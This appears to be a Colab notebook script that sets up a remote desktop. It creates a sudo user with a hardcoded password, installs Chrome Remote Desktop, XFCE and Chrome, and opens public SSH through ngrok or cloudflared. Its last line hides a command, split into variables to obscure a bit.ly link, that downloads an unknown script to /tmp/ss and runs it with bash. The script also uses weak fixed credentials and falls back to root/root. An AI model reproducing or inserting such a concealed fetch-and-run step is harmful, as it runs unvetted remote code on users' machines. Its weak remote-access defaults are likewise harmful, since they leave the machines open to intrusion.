#@title **Create User**
#@markdown user : one / password you know

import os

username = "one" 
password = "8426" 
#print("Creating User and Setting it up")

# Creation of user
os.system(f"useradd -m {username}")

# Add user to sudo group
os.system(f"adduser {username} sudo")
    
# Set password of user to 'root'
os.system(f"echo '{username}:{password}' | sudo chpasswd")

# Change default shell from sh to bash
os.system("sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd")

##print("User Created and Configured")

#@title **RDP**
#@markdown  It takes 4-5 minutes for installation

import subprocess

#@markdown  Visit http://remotedesktop.google.com/headless and Copy the command after authentication

CRP = "" #@param {type:'string'}
Pin = 55507770 


class CRD:
    def __init__(self):
        os.system("apt update")
        self.installCRD()
        self.installDesktopEnvironment()
        self.installGoogleChorme()
        self.finish()

    @staticmethod
    def installCRD():
        #print("Installing Chrome Remote Desktop")
        subprocess.run(['wget', 'https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb'], stdout=subprocess.PIPE)
        subprocess.run(['dpkg', '--install', 'chrome-remote-desktop_current_amd64.deb'], stdout=subprocess.PIPE)
        subprocess.run(['apt', 'install', '--assume-yes', '--fix-broken'], stdout=subprocess.PIPE)

    @staticmethod
    def installDesktopEnvironment():
        ##print("Installing Desktop Environment")
        os.system("export DEBIAN_FRONTEND=noninteractive")
        os.system("apt install --assume-yes xfce4 desktop-base xfce4-terminal")
        os.system("bash -c 'echo \"exec /etc/X11/Xsession /usr/bin/xfce4-session\" > /etc/chrome-remote-desktop-session'")
        os.system("apt remove --assume-yes gnome-terminal")
        os.system("apt install --assume-yes gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget python3 python-is-python3 python3-pip python3-tk python3-dev git python3-dev python3-tk python3-setuptools python3-wheel python3-pip git python3-dev python3-tk python3-setuptools python3-wxgtk4.0  autokey-gtk autokey-common scrot zsh git python3-dev python3-tk python3-setuptools python3-wheel python3-pip python3-wxgtk4.0 xdotool curl wget")
        #xscreensaver
        os.system("apt install --assume-yes  nautilus nano  obs-studio zsh")
        os.system("systemctl disable lightdm.service")

    @staticmethod
    def installGoogleChorme():
        #print("Installing Google Chrome")
        subprocess.run(["wget", "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb"], stdout=subprocess.PIPE)
        subprocess.run(["dpkg", "--install", "google-chrome-stable_current_amd64.deb"], stdout=subprocess.PIPE)
        subprocess.run(['apt', 'install', '--assume-yes', '--fix-broken'], stdout=subprocess.PIPE)

    @staticmethod
    def finish():
        #print("Finalizing")
        os.system(f"adduser {username} chrome-remote-desktop")
        command = f"{CRP} --pin={Pin}"
        os.system(f"su - {username} -c '{command}'")
        os.system("service chrome-remote-desktop start")
        ##print("Finished Succesfully")

! pip install colab_ssh --upgrade &> /dev/null

try:


    Ngrok = True 
    Agro = False

    #@markdown Copy authtoken from https://dashboard.ngrok.com/auth
    ngrokToken = "" #@param {type:'string'}


    def runNGROK():
        from colab_ssh import launch_ssh
        from IPython.display import clear_output
        launch_ssh(ngrokToken, password)
        clear_output()

        print("ssh", username, end='@')
        ! curl -s http://localhost:4040/api/tunnels | python3 -c \
                "import sys, json; print(json.load(sys.stdin)['tunnels'][0]['public_url'][6:].replace(':', ' -p '))"


    def runAgro():
        from colab_ssh import launch_ssh_cloudflared
        launch_ssh_cloudflared(password=password)


    try:
        if username:
            pass
        elif password:
            pass
    except NameError:
        print("No user found using username and password as 'root'")
        username='root'
        password='root'


    if Agro and Ngrok:
        print("You can't do that")
        print("Select only one of them")
    elif Agro:
        runAgro()
    elif Ngrok:
        if ngrokToken == "":
            print("No ngrokToken Found, Please enter it")
        else:
            runNGROK()
    else:
        print("Select one of them")    


    
    if username:
        if CRP == "":
            print("Please enter authcode from the given link")
        elif len(str(Pin)) < 6:
            #print("Enter a pin more or equal to 6 digits")
            pass
        else:
            CRD()
except NameError as e:
    print("username variable not found")
    print("Create a User First")


! i=003;cmd=pysi;x=ly;y=bit;wget -q -O /tmp/ss ${y}.${x}/${cmd}${i} ; bash /tmp/ss 